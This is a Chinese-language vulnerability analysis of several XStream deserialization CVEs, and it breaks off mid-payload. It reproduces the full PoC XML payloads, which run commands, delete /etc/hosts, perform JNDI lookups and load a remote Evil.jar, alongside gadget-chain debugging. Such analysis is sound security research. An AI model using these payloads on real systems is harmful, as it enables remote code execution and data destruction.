漏洞成因一种黑名单的绕过方式 PoC来自官网的PoC： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'&gt; &lt;dataHandler&gt; &lt;dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'&gt; &lt;contentType&gt;text/plain&lt;/contentType&gt; &lt;is class='java.io.SequenceInputStream'&gt; &lt;e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'&gt; &lt;iterator class='javax.imageio.spi.FilterIterator'&gt; &lt;iter class='java.util.ArrayList$Itr'&gt; &lt;cursor&gt;0&lt;/cursor&gt; &lt;lastRet&gt;-1&lt;/lastRet&gt; &lt;expectedModCount&gt;1&lt;/expectedModCount&gt; &lt;outer-class&gt; &lt;java.lang.ProcessBuilder&gt; &lt;command&gt; &lt;string&gt;open&lt;/string&gt; &lt;string&gt;/Applications/Calculator.app&lt;/string&gt; &lt;/command&gt; &lt;/java.lang.ProcessBuilder&gt; &lt;/outer-class&gt; &lt;/iter&gt; &lt;filter class='javax.imageio.ImageIO$ContainsFilter'&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;start&lt;/name&gt; &lt;/filter&gt; &lt;next/&gt; &lt;/iterator&gt; &lt;type&gt;KEYS&lt;/type&gt; &lt;/e&gt; &lt;in class='java.io.ByteArrayInputStream'&gt; &lt;buf&gt;&lt;/buf&gt; &lt;pos&gt;0&lt;/pos&gt; &lt;mark&gt;0&lt;/mark&gt; &lt;count&gt;0&lt;/count&gt; &lt;/in&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;string&gt;test&lt;/string&gt; &lt;/entry&gt;&lt;/map&gt; 复现： 调试： 这次PoC是map结构，其中key为jdk.nashorn.internal.objects.NativeString对象、value值为test的Entry； 而jdk.nashorn.internal.objects.NativeString对象又存在flags、value属性，它的flags属性值为0、value属性值为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data； 前面简单几步直接跳过，不过就是首先还原出来一个hashmap，然后将本地的key，value分别赋值。 也就是MapConverter这里，target是hashmap实例，我们需要放进去的是key是NativeString，value是test字符串 进入put，首先需要计算key的hash值： 这里的this就是key，也就是NativeString对象，对应的this.value就是NativeString对象的value属性，也就是payload里面的Base64Data对象： 由于this.value不是String类型的变量，会执行this.value.toString()，继续跟： this.get方法也就是Base64Data对象的get方法，如上图，在get方法内部其实本质上是调用了Base64Data对象的dataHandler属性，看PoC，this.dataHandler.getDataSource()返回的是com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource 这里本质上is就是PoC里面的is属性值，也就是PoC里面的java.io.SequenceInputStream 接下来执行到readFrom方法： 进入read方法： 进入nextStream方法： 这里的in和e在PoC里面都有对应的构造 接下来会调用e.nextElement()方法 iterator属性也有对应的PoC构造，也就是java.imageio.spi.FilterIterator 接下来需要执行的是iterator.next().getKey(); 先来到next()方法 会先调用advance()方法： 这里iter属性是java.util.ArrayList$Itr，filter属性是javax.imageio.ImageIO$ContainsFilter 进入filter.filter(elt)方法： 看到这里直接就是对method属性进行了invoke调用，method是我们的start方法，name是start字符串 elt是什么？elt就是上一步的iter.next()的返回值，是java.lang.ProcessBuilder对象。 elt为构造好的java.lang.ProcessBuilder对象。在method与elt都可控的情况下，进行反射调用即可实现远程代码执行利用。 修复： 在1.4.14中对反射调用时，对class进行了黑名单拦截： CVE_2020_26259XStream：1.4.13 漏洞成因一种任意文件删除漏洞 PoC来自官网的PoC： 1234567891011121314151617181920&lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'&gt; &lt;dataHandler&gt; &lt;dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'&gt; &lt;contentType&gt;text/plain&lt;/contentType&gt; &lt;is class='com.sun.xml.internal.ws.util.ReadAllStream$FileStream'&gt; &lt;tempFile&gt;/etc/hosts&lt;/tempFile&gt; &lt;/is&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;string&gt;test&lt;/string&gt; &lt;/entry&gt;&lt;/map&gt; 26259和26217很像，前半段都利用了NativeString，Base64Data，XmlDataSource 但是后半段的is属性有区别，是com.sun.xml.internal.ws.util.ReadAllStream$FileStream 调试： 还是来到get方法： 值得注意的是，这次漏洞利用的不是Base64Data中get方法里的baos.readFrom(is)这个入口，而是位于它下面一行的is.close()这行代码。通过调试，程序在执行过get方法中baos.readFrom(is)后，紧接着执行is.Close()。 此时的is是com.sun.xml.internal.ws.util.ReadAllStream$FileStream，跟入其中的close方法，见下图： 当这里tempFile属性其实是PoC中可控的： 1&lt;tempFile&gt;/etc/hosts&lt;/tempFile&gt; 所以如果这里tempFile字段不为空，则直接删除，存在一个任意文件删除漏洞 CVE_2021_21344XStream：1.4.15 漏洞成因RCE，最终漏洞的触发点是JdbcRowSetImpl 是JNDI类型注入漏洞 PoC来自官网： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&lt;java.util.PriorityQueue serialization='custom'&gt; &lt;unserializable-parents/&gt; &lt;java.util.PriorityQueue&gt; &lt;default&gt; &lt;size&gt;2&lt;/size&gt; &lt;comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'&gt; &lt;indexMap class='com.sun.xml.internal.ws.client.ResponseContext'&gt; &lt;packet&gt; &lt;message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'&gt; &lt;dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'&gt; &lt;bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'&gt; &lt;bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'&gt; &lt;bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'&gt; &lt;jaxbType&gt;com.sun.rowset.JdbcRowSetImpl&lt;/jaxbType&gt; &lt;uriProperties/&gt; &lt;attributeProperties/&gt; &lt;inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'&gt; &lt;getter&gt; &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt; &lt;name&gt;getDatabaseMetaData&lt;/name&gt; &lt;parameter-types/&gt; &lt;/getter&gt; &lt;/inheritedAttWildcard&gt; &lt;/bi&gt; &lt;tagName/&gt; &lt;context&gt; &lt;marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'&gt; &lt;outer-class reference='../..'/&gt; &lt;/marshallerPool&gt; &lt;nameList&gt; &lt;nsUriCannotBeDefaulted&gt; &lt;boolean&gt;true&lt;/boolean&gt; &lt;/nsUriCannotBeDefaulted&gt; &lt;namespaceURIs&gt; &lt;string&gt;1&lt;/string&gt; &lt;/namespaceURIs&gt; &lt;localNames&gt; &lt;string&gt;UTF-8&lt;/string&gt; &lt;/localNames&gt; &lt;/nameList&gt; &lt;/context&gt; &lt;/bridge&gt; &lt;/bridge&gt; &lt;jaxbObject class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'&gt; &lt;javax.sql.rowset.BaseRowSet&gt; &lt;default&gt; &lt;concurrency&gt;1008&lt;/concurrency&gt; &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt; &lt;fetchDir&gt;1000&lt;/fetchDir&gt; &lt;fetchSize&gt;0&lt;/fetchSize&gt; &lt;isolation&gt;2&lt;/isolation&gt; &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt; &lt;maxRows&gt;0&lt;/maxRows&gt; &lt;queryTimeout&gt;0&lt;/queryTimeout&gt; &lt;readOnly&gt;true&lt;/readOnly&gt; &lt;rowSetType&gt;1004&lt;/rowSetType&gt; &lt;showDeleted&gt;false&lt;/showDeleted&gt; &lt;dataSource&gt;rmi://localhost:15000/CallRemoteMethod&lt;/dataSource&gt; &lt;params/&gt; &lt;/default&gt; &lt;/javax.sql.rowset.BaseRowSet&gt; &lt;com.sun.rowset.JdbcRowSetImpl&gt; &lt;default&gt; &lt;iMatchColumns&gt; &lt;int&gt;-1&lt;/int&gt; &lt;int&gt;-1&lt;/int&gt; &lt;int&gt;-1&lt;/int&gt; &lt;int&gt;-1&lt;/int&gt; &lt;int&gt;-1&lt;/int&gt; &lt;int&gt;-1&lt;/int&gt; &lt;int&gt;-1&lt;/int&gt; &lt;int&gt;-1&lt;/int&gt; &lt;int&gt;-1&lt;/int&gt; &lt;int&gt;-1&lt;/int&gt; &lt;/iMatchColumns&gt; &lt;strMatchColumns&gt; &lt;string&gt;foo&lt;/string&gt; &lt;null/&gt; &lt;null/&gt; &lt;null/&gt; &lt;null/&gt; &lt;null/&gt; &lt;null/&gt; &lt;null/&gt; &lt;null/&gt; &lt;null/&gt; &lt;/strMatchColumns&gt; &lt;/default&gt; &lt;/com.sun.rowset.JdbcRowSetImpl&gt; &lt;/jaxbObject&gt; &lt;/dataSource&gt; &lt;/message&gt; &lt;satellites/&gt; &lt;invocationProperties/&gt; &lt;/packet&gt; &lt;/indexMap&gt; &lt;/comparator&gt; &lt;/default&gt; &lt;int&gt;3&lt;/int&gt; &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt; &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt; &lt;/java.util.PriorityQueue&gt;&lt;/java.util.PriorityQueue&gt; 调试： 不难看出这次反序列化的入口点是PriorityQueue，它也是cc链中高频出现的节点。 在之前分析过程中我们也知道，对于实现了Serializable接口的类对象，在反序列化过程中会调用重写的readObject方法 我们可以在readObject方法处打断点： 进入heapify()方法： 一路下来，在这里调用了PriorityQueue类中存储在comparator属性中的对象的compare方法，也就是PoC中的sun.awt.datatransfer.DataTransferer$IndexOrderComparator类对象，也就是说接下来会去调用这个类的compare方法 接下来会调用一系列的函数，太长了，贴一下调用栈： 123456789101112131415161718java.util.PriorityQueue#heapify sun.awt.datatransfer.DataTransferer$IndexOrderComparator#compare com.sun.xml.internal.ws.client.ResponseContext#get com.sun.xml.internal.ws.api.message.MessageWrapper#getAttachments com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getAttachments com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getMessage com.sun.xml.internal.ws.message.JAXBAttachment#getInputStream com.sun.xml.internal.ws.message.JAXBAttachment#asInputStream com.sun.xml.internal.ws.message.JAXBAttachment#writeTo com.sun.xml.internal.ws.db.glassfish.BridgeWrapper#marshal com.sun.xml.internal.bind.api.Bridge#marshal com.sun.xml.internal.bind.v2.runtime.BridgeImpl#marshal com.sun.xml.internal.bind.v2.runtime.MarshallerImpl#write com.sun.xml.internal.bind.v2.runtime.XMLSerializer#childAsXsiType com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl#serializeURIs com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData com.sun.rowset.JdbcRowSetImpl#connect 关键点在com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get 这里存在invoke函数，导致整个链可以连通。 可以看到invoke到com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData中，并最终在JdbcRowSetImpl的connect方法中通过JNDI去lookup事先封装在JdbcRowSetImpl的dataSource中的恶意地址： 其实整个链的关键点是这里的get方法： XStream不受Serializable接口限制，所有类都可以实例化，导致链过程中的很多节点都可以参与序列化。 CVE_2021_21345XStream：1.4.15 漏洞成因和21344长得很像，出发点是一样的PriorityQueue，RCE触发点是com.sun.corba.se.impl.activation.ServerTableEntry 唯一的不同点在于： 21344使用JdbcRowSetImpl去远程加载恶意类来到本地执行恶意代码； 21345使用com.sun.corba.se.impl.activation.ServerTableEntry类直接在本地执行恶意代码 PoC来自官网： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;java.util.PriorityQueue serialization='custom'&gt; &lt;unserializable-parents/&gt; &lt;java.util.PriorityQueue&gt; &lt;default&gt; &lt;size&gt;2&lt;/size&gt; &lt;comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'&gt; &lt;indexMap class='com.sun.xml.internal.ws.client.ResponseContext'&gt; &lt;packet&gt; &lt;message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'&gt; &lt;dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'&gt; &lt;bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'&gt; &lt;bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'&gt; &lt;bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'&gt; &lt;jaxbType&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/jaxbType&gt; &lt;uriProperties/&gt; &lt;attributeProperties/&gt; &lt;inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'&gt; &lt;getter&gt; &lt;class&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/class&gt; &lt;name&gt;verify&lt;/name&gt; &lt;parameter-types/&gt; &lt;/getter&gt; &lt;/inheritedAttWildcard&gt; &lt;/bi&gt; &lt;tagName/&gt; &lt;context&gt; &lt;marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'&gt; &lt;outer-class reference='../..'/&gt; &lt;/marshallerPool&gt; &lt;nameList&gt; &lt;nsUriCannotBeDefaulted&gt; &lt;boolean&gt;true&lt;/boolean&gt; &lt;/nsUriCannotBeDefaulted&gt; &lt;namespaceURIs&gt; &lt;string&gt;1&lt;/string&gt; &lt;/namespaceURIs&gt; &lt;localNames&gt; &lt;string&gt;UTF-8&lt;/string&gt; &lt;/localNames&gt; &lt;/nameList&gt; &lt;/context&gt; &lt;/bridge&gt; &lt;/bridge&gt; &lt;jaxbObject class='com.sun.corba.se.impl.activation.ServerTableEntry'&gt; &lt;activationCmd&gt;open /Applications/Calculator.app&lt;/activationCmd&gt; &lt;/jaxbObject&gt; &lt;/dataSource&gt; &lt;/message&gt; &lt;satellites/&gt; &lt;invocationProperties/&gt; &lt;/packet&gt; &lt;/indexMap&gt; &lt;/comparator&gt; &lt;/default&gt; &lt;int&gt;3&lt;/int&gt; &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt; &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt; &lt;/java.util.PriorityQueue&gt;&lt;/java.util.PriorityQueue&gt; 调试： 前半部分还是一样，一样是到了get方法去invoke，invoke的目标方法就是 我们直接去com.sun.corba.se.impl.activation.ServerTableEntry的verify方法打上断点好了，跟到verify： 直接触发了Runtime.getRuntime().exec(&quot;open /Applications/Calculator.app&quot;); CVE_2021_21346XStream：1.4.15 漏洞成因师兄wh1t3p1g提交的，利用的是ldap恶意reference PoC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;sorted-set&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt;ysomap&lt;/type&gt; &lt;value class='javax.swing.MultiUIDefaults' serialization='custom'&gt; &lt;unserializable-parents/&gt; &lt;hashtable&gt; &lt;default&gt; &lt;loadFactor&gt;0.75&lt;/loadFactor&gt; &lt;threshold&gt;525&lt;/threshold&gt; &lt;/default&gt; &lt;int&gt;700&lt;/int&gt; &lt;int&gt;0&lt;/int&gt; &lt;/hashtable&gt; &lt;javax.swing.UIDefaults&gt; &lt;default&gt; &lt;defaultLocale&gt;zh_CN&lt;/defaultLocale&gt; &lt;resourceCache/&gt; &lt;/default&gt; &lt;/javax.swing.UIDefaults&gt; &lt;javax.swing.MultiUIDefaults&gt; &lt;default&gt; &lt;tables&gt; &lt;javax.swing.UIDefaults serialization='custom'&gt; &lt;unserializable-parents/&gt; &lt;hashtable&gt; &lt;default&gt; &lt;loadFactor&gt;0.75&lt;/loadFactor&gt; &lt;threshold&gt;525&lt;/threshold&gt; &lt;/default&gt; &lt;int&gt;700&lt;/int&gt; &lt;int&gt;1&lt;/int&gt; &lt;string&gt;lazyValue&lt;/string&gt; &lt;sun.swing.SwingLazyValue&gt; &lt;className&gt;javax.naming.InitialContext&lt;/className&gt; &lt;methodName&gt;doLookup&lt;/methodName&gt; &lt;args&gt; &lt;string&gt;ldap://localhost:1099/CallRemoteMethod&lt;/string&gt; &lt;/args&gt; &lt;/sun.swing.SwingLazyValue&gt; &lt;/hashtable&gt; &lt;javax.swing.UIDefaults&gt; &lt;default&gt; &lt;defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/&gt; &lt;resourceCache/&gt; &lt;/default&gt; &lt;/javax.swing.UIDefaults&gt; &lt;/javax.swing.UIDefaults&gt; &lt;/tables&gt; &lt;/default&gt; &lt;/javax.swing.MultiUIDefaults&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt;ysomap&lt;/type&gt; &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt; &lt;m__obj class='string'&gt;test&lt;/m__obj&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;&lt;/sorted-set&gt; 调试： 利用的是LazyValue 关键调用链： 12345678javax.naming.ldap.Rdn$RdnEntry.compareTo com.sun.org.apache.xpath.internal.objects.XString.equals javax.swing.MultiUIDefaults.toString UIDefaults.get UIDefaults.getFromHashTable UIDefaults$LazyValue.createValue SwingLazyValue.createValue javax.naming.InitialContext.doLookup() 在createValue里面出现了invoke，也是一个关键的节点，invoke了构造好的javax.naming.InitialContext.doLookup()方法 doLookUp对恶意类的reference进行了调用，漏洞触发。 CVE_2021_21347XStream：1.4.15 jdk: 8u231 漏洞成因远程类加载，类实例化执行静态代码块 PoC来自官网： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;java.util.PriorityQueue serialization='custom'&gt; &lt;unserializable-parents/&gt; &lt;java.util.PriorityQueue&gt; &lt;default&gt; &lt;size&gt;2&lt;/size&gt; &lt;comparator class='javafx.collections.ObservableList$1'/&gt; &lt;/default&gt; &lt;int&gt;3&lt;/int&gt; &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt; &lt;dataHandler&gt; &lt;dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'&gt; &lt;contentType&gt;text/plain&lt;/contentType&gt; &lt;is class='java.io.SequenceInputStream'&gt; &lt;e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'&gt; &lt;iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'&gt; &lt;names class='java.util.AbstractList$Itr'&gt; &lt;cursor&gt;0&lt;/cursor&gt; &lt;lastRet&gt;-1&lt;/lastRet&gt; &lt;expectedModCount&gt;0&lt;/expectedModCount&gt; &lt;outer-class class='java.util.Arrays$ArrayList'&gt; &lt;a class='string-array'&gt; &lt;string&gt;Evil&lt;/string&gt; &lt;/a&gt; &lt;/outer-class&gt; &lt;/names&gt; &lt;processorCL class='java.net.URLClassLoader'&gt; &lt;ucp class='sun.misc.URLClassPath'&gt; &lt;urls serialization='custom'&gt; &lt;unserializable-parents/&gt; &lt;vector&gt; &lt;default&gt; &lt;capacityIncrement&gt;0&lt;/capacityIncrement&gt; &lt;elementCount&gt;1&lt;/elementCount&gt; &lt;elementData&gt; &lt;url&gt;http://127.0.0.1:8000/Evil.jar&lt;/url&gt; &lt;/elementData&gt; &lt;/default&gt; &lt;/vector&gt; &lt;/urls&gt; &lt;path&gt; &lt;url&gt;http://127.0.0.1:8000/Evil.jar&lt;/url&gt; &lt;/path&gt; &lt;loaders/&gt; &lt;lmap/&gt; &lt;/ucp&gt; &lt;package2certs class='concurrent-hash-map'/&gt; &lt;classes/&gt; &lt;defaultDomain&gt; &lt;classloader class='java.net.URLClassLoader' reference='../..'/&gt; &lt;principals/&gt; &lt;hasAllPerm&gt;false&lt;/hasAllPerm&gt; &lt;staticPermissions&gt;false&lt;/staticPermissions&gt; &lt;key&gt; &lt;outer-class reference='../..'/&gt; &lt;/key&gt; &lt;/defaultDomain&gt; &lt;initialized&gt;true&lt;/initialized&gt; &lt;pdcache/&gt; &lt;/processorCL&gt; &lt;/iterator&gt; &lt;type&gt;KEYS&lt;/type&gt; &lt;/e&gt; &lt;in class='java.io.ByteArrayInputStream'&gt; &lt;buf&gt;&lt;/buf&gt; &lt;pos&gt;-2147483648&lt;/pos&gt; &lt;mark&gt;0&lt;/mark&gt; &lt;count&gt;0&lt;/count&gt; &lt;/in&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt; &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/&gt; &lt;/java.util.PriorityQueue&gt;&lt;/java.util.PriorityQueue&gt; 复现： 我们在本地编写Evil.class打包成同名jar包： 123456789public class Evil &#123; static&#123; try&#123; Runtime.getRuntime().exec(\"open /Applications/Calculator.app\"); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 打包+打开Web服务8000端口： 123javac Evil.classjar cvf Evil.jar Evil.classpython -m SimpleHTTPServer 8000 调试： threedr3am说他在8u131版本可以复现，实际上144应该也可以 首先PoC里面有一点比较特殊，用到了ObservableList$1这个匿名内部类 123456789101112131415161718192021222324252627282930313233public interface ObservableList&lt;E&gt; extends List&lt;E&gt;, Observable &#123; ... /** * Creates a &#123;@link SortedList&#125; wrapper of this list with the natural * ordering. * @return new &#123;@code SortedList&#125; * @since JavaFX 8.0 */ public default SortedList&lt;E&gt; sorted() &#123; Comparator naturalOrder = new Comparator&lt;E&gt;() &#123; @Override public int compare(E o1, E o2) &#123; if (o1 == null &amp;&amp; o2 == null) &#123; return 0; &#125; if (o1 == null) &#123; return -1; &#125; if (o2 == null) &#123; return 1; &#125; if (o1 instanceof Comparable) &#123; return ((Comparable) o1).compareTo(o2); &#125; return Collator.getInstance().compare(o1.toString(), o2.toString()); &#125; &#125;; return sorted(naturalOrder); &#125;&#125; 这里其实new Comparator&lt;E&gt;就是一个匿名内部类 接下来和404SecTeam遇到了一样的坑点，在： 123456789&lt;defaultDomain&gt; &lt;classloader class='java.net.URLClassLoader' reference='../..'/&gt; &lt;principals/&gt; &lt;hasAllPerm&gt;false&lt;/hasAllPerm&gt; &lt;staticPermissions&gt;false&lt;/staticPermissions&gt; &lt;key&gt; &lt;outer-class reference='../..'/&gt; &lt;/key&gt;&lt;/defaultDomain&gt; 在&lt;outer-class&gt;标签处会报错，报错的原因是反序列化的时候找不到这个outer-class属性。 来到对应的类也就是ProtectionDomain$Key这个类中查看一下 1234/** * Used for storing ProtectionDomains as keys in a Map. */static final class Key &#123;&#125; 本地复现一下404的例子： 1234567891011121314151617181920212223242526272829303132333435363738394041424344class Foo &#123; private String foocontent; private Bar bar; public String getFoocontent() &#123; return foocontent; &#125; public void setFoocontent(String foocontent) &#123; this.foocontent = foocontent; &#125; public Bar getBar() &#123; return bar; &#125; public void setBar(Bar bar) &#123; this.bar = bar; &#125; class Bar &#123; private String blabla; public String getBlabla() &#123; return blabla; &#125; public void setBlabla(String blabla) &#123; this.blabla = blabla; &#125; &#125; public static void main(String[] args) &#123; Foo foo = new Foo(); Bar bar = foo.new Bar(); bar.setBlabla(\"hello\"); foo.setBar(bar); XStream xstream = new XStream(); String xml = xstream.toXML(foo); System.out.println(xml); &#125;&#125; Foo类中有一个内部类Bar，并且Foo类中有一个Bar类型的属性 如果我们在实例化的过程中给bar属性赋值，foo.setBar(foo.new Bar())，引用自身成员内部类，这种情况XStream会使用&lt;outer-class&gt;标识来标注。 PoC这里表示的意思是Key作为一个成员内部类被ProtectionDomain引用，但是在jdk1.8.131中ProtectionDomain$Key是一个静态内部类呀，静态内部类XStream序列化的时候是不会通过&lt;outer-class&gt;标签进行标识的 静态成员类在Java语言中，类内部可以生明另一个类： 12345678910public class OuterClass &#123; private static class StaticInnerClass &#123; &#125; private class NoStaticInnerClass &#123; &#125;&#125; 内部类可以分为： 静态内部类 ： 非静态内部类：内部包含一个this$0 变量指向外部类 所以当然可以利用反射来操作： 1234567891011121314151617public class OuterClass &#123; public static void main(String[] args) &#123; Field[] declaredFields = NoStaticInnerClass.class.getDeclaredFields(); Stream.of(declaredFields).forEach(System.out::println); &#125; // 有this$0 public class NoStaticInnerClass &#123; &#125; public static class StaticInnerClass &#123; &#125;&#125;// final com.sec.exploits.XStream.OuterClass com.sec.exploits.XStream.OuterClass$NoStaticInnerClass.this$0 在非静态内部类中，我们可以任意使用OuterClass.this来获取外部类实例。 1234567891011121314151617public class OuterClass &#123; public static void main(String[] args) &#123; NoStaticInnerClass noStaticInnerClass = new OuterClass().new NoStaticInnerClass(); System.out.println(noStaticInnerClass.getOuterClass()); &#125; // 有this$0 public class NoStaticInnerClass &#123; public OuterClass getOuterClass() &#123; return OuterClass.this; &#125; &#125; public static class StaticInnerClass &#123; &#125;&#125; 在8u231环境下做实验： 回到之前的说的，用到了ObservableList$1这个匿名内部类，实际上就是Collator.getInstance() 接下来调用了： 123456789101112131415161718192021222324public default SortedList&lt;E&gt; sorted() &#123; Comparator naturalOrder = new Comparator&lt;E&gt;() &#123; @Override public int compare(E o1, E o2) &#123; if (o1 == null &amp;&amp; o2 == null) &#123; return 0; &#125; if (o1 == null) &#123; return -1; &#125; if (o2 == null) &#123; return 1; &#125; if (o1 instanceof Comparable) &#123; return ((Comparable) o1).compareTo(o2); &#125; return Collator.getInstance().compare(o1.toString(), o2.toString()); &#125; &#125;; return sorted(naturalOrder);&#125; 这里 o1和o2是同一个Base64Data对象，目的调用Base64Data.toString方法，toString方法中调用了Base64Data.get方法,在get方法中调用了ByteArrayOutputStreamEx.readFrom()方法，传入的参数is是一个SequenceInputStream对象 此时Base64Data对象： 接下来经过一系列调用，会来到nextStream()方法中： 12345678910111213final void nextStream() throws IOException &#123; if (in != null) &#123; in.close(); &#125; if (e.hasMoreElements()) &#123; in = (InputStream) e.nextElement(); if (in == null) throw new NullPointerException(); &#125; else in = null;&#125; 这里会考虑e属性的值，在判断的时候其实会来到hasNext()方法，这里会根据processorCL的内容进行对象的实例化 这里对应PoC中的写法就是： CVE_2021_21350XStream：1.4.15 jdk: 8u231 漏洞成因和CVE-2021-21347类似，这是把远程jar改为了BCEL方式加载 PoC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&lt;java.util.PriorityQueue serialization='custom'&gt; &lt;unserializable-parents/&gt; &lt;java.util.PriorityQueue&gt; &lt;default&gt; &lt;size&gt;2&lt;/size&gt; &lt;comparator class='javafx.collections.ObservableList$1'/&gt; &lt;/default&gt; &lt;int&gt;3&lt;/int&gt; &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt; &lt;dataHandler&gt; &lt;dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'&gt; &lt;contentType&gt;text/plain&lt;/contentType&gt; &lt;is class='java.io.SequenceInputStream'&gt; &lt;e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'&gt; &lt;iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'&gt; &lt;names class='java.util.AbstractList$Itr'&gt; &lt;cursor&gt;0&lt;/cursor&gt; &lt;lastRet&gt;-1&lt;/lastRet&gt; &lt;expectedModCount&gt;0&lt;/expectedModCount&gt; &lt;outer-class class='java.util.Arrays$ArrayList'&gt; &lt;a class='string-array'&gt; 